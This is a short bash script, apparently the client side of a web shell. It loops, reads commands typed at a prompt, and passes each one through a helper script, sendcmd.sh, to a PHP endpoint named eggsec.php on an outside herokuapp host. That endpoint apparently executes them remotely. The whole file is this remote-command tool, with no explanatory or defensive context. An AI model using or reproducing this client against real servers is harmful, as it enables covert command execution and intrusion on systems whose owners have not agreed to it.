while true; do
printf "> "; read cmd;
if [[ $cmd == "exit" ]]; then exit; fi
sh sendcmd.sh http://fileservant.herokuapp.com/eggsec.php "$cmd";
done
